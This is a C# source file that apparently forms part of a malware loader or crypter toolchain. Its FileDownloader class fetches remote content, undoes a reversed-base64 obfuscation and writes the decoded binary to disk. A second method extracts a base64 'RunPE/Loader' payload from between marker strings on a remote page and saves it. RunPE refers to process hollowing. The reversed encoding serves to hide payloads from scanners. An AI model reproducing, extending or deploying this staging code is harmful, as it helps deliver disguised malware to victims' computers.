using System;
using System.IO;
using System.Linq;
using System.Net;
using System.Text;

public class FileDownloader
{
    private const string BASE64_START = "<<BASE64_START>>";
    private const string BASE64_END = "<<BASE64_END>>";

    private const string DOWNLOAD_PROGRESS_MSG = "\r{0} Download Progress: ";
    private const string DOWNLOAD_FAILED_HOST_MSG = "\n{0} download failed: Host is not up or cannot be resolved.";
    private const string DOWNLOAD_FAILED_MSG = "\n{0} download failed: {1}";
    private const string DOWNLOAD_SUCCESS_MSG = "\n{0} download completed successfully.";
    private const string RUNPE_PROCESS_SUCCESS_MSG = "RunPE/Loader file processed and saved successfully.";
    private const string RUNPE_PROCESS_ERROR_MSG = "Error processing RunPE/Loader file: {0}";
    public bool Download(string url, string savePath)
    {
        using (WebClient client = new WebClient())
        {
            try
            {
                string fileType = Path.GetFileNameWithoutExtension(new Uri(url).LocalPath);
                ConsoleHelper.WriteLine($"Downloading {fileType}...", ConsoleColor.Cyan);

                byte[] downloadedData = client.DownloadData(new Uri(url));

                ConsoleHelper.WriteLine("Processing downloaded content...", ConsoleColor.Cyan);
                string reversedBase64 = Encoding.UTF8.GetString(downloadedData);
                string correctBase64 = new string(reversedBase64.Reverse().ToArray());

                byte[] decodedData;
                try
                {
                    decodedData = Convert.FromBase64String(correctBase64);
                }
                catch (FormatException)
                {
                    ConsoleHelper.WriteLine("Error: The downloaded content is not a valid Base64 string.", ConsoleColor.Red);
                    return false;
                }

                File.WriteAllBytes(savePath, decodedData);

                ConsoleHelper.WriteLine($"{fileType} downloaded and processed successfully.", ConsoleColor.Green);
                ConsoleHelper.WriteLine($"Saved to: {savePath}", ConsoleColor.Green);
                return true;
            }
            catch (WebException ex)
            {
                ConsoleHelper.WriteLine($"Download failed: {ex.Message}", ConsoleColor.Red);
                return false;
            }
            catch (Exception ex)
            {
                ConsoleHelper.WriteLine($"An unexpected error occurred: {ex.Message}", ConsoleColor.Red);
                return false;
            }
        }
    }

    public bool ProcessRunPE(string url, string savePath)
    {
        try
        {
            using (WebClient client = new WebClient())
            {
                string content = Encoding.UTF8.GetString(client.DownloadData(url));
                int start = content.IndexOf(BASE64_START) + BASE64_START.Length;
                int end = content.IndexOf(BASE64_END);

                if (start < 0 || end <= start) throw new Exception("BASE64 content not found");

                byte[] data = Convert.FromBase64String(content.Substring(start, end - start));
                File.WriteAllBytes(savePath, data);

                ConsoleHelper.WriteLine(RUNPE_PROCESS_SUCCESS_MSG, ConsoleColor.Green);
                return true;
            }
        }
        catch (Exception ex)
        {
            Console.ForegroundColor = ConsoleColor.Red;
            ConsoleHelper.WriteLine(string.Format(RUNPE_PROCESS_ERROR_MSG, ex.Message), ConsoleColor.Red);
            Console.ResetColor();
            return false;
        }
    }
}